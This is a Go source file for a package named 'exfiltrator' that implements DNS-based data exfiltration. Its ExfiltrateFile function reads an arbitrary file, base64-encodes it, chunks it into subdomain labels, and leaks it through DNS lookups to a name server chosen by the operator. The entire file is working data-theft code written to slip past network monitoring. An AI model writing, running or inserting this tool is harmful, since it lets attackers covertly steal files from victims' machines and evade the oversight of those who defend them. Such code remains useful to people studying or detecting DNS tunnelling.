package exfiltrator

import (
	"context"
	"encoding/base64"
	"io/ioutil"
	"log"
	"net"
	"strings"
)

const (
	// To simplify implementations, the total length of a domain name (i.e.,
	// label octets and label length octets) is restricted to 255 octets or
	// less.
	// - https://www.rfc-editor.org/rfc/rfc1035#section-3.1
	MAX_DOMAIN_NAME_LENGTH = 255
	// Each node has a label, which is zero to 63 octets in length.
	// - https://www.rfc-editor.org/rfc/rfc1034#section-3.1
	MAX_SUBDOMAIN_NAME_LENGTH = 63
)

type dnsExfiltrator struct {
	NameServer string
}

func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
	absoluteNameServer := nameServer
	if nameServer[len(nameServer)-1] != '.' {
		absoluteNameServer += "."
	}
	return &dnsExfiltrator{
		NameServer: absoluteNameServer,
	}
}

func encodeToModifiedBase64(data []byte) string {
	base64Data := base64.URLEncoding.EncodeToString(data)
	// Cannot have '=' in domain names.
	return strings.Replace(base64Data, "=", "-", -1)
}

func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Fatalln(err)
	}

	encodedData := encodeToModifiedBase64(data)

	// Subtract 1 to account for the period that delimits the data being exfiltrated and the name server.
	numOfBytesPerQuery := MAX_DOMAIN_NAME_LENGTH - len(ex.NameServer) - 1

	for len(encodedData) != 0 {
		bytesLeft := numOfBytesPerQuery
		dataToExfiltrate := ""
		for bytesLeft > 0 {
			numBytesToAdd := bytesLeft
			if numBytesToAdd > MAX_SUBDOMAIN_NAME_LENGTH {
				numBytesToAdd = MAX_SUBDOMAIN_NAME_LENGTH
			}
			remainingBytes := len(encodedData)
			if numBytesToAdd > remainingBytes {
				numBytesToAdd = remainingBytes
			}

			dataToExfiltrate += encodedData[:numBytesToAdd] + "."
			encodedData = encodedData[numBytesToAdd:]
			if len(encodedData) == 0 {
				break
			}

			// Subtract 1 to account for the period that delimits subdomains.
			bytesLeft -= numBytesToAdd + 1
		}

		_, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", dataToExfiltrate+ex.NameServer)
		if err != nil {
			log.Fatalln(err)
		}
	}
}
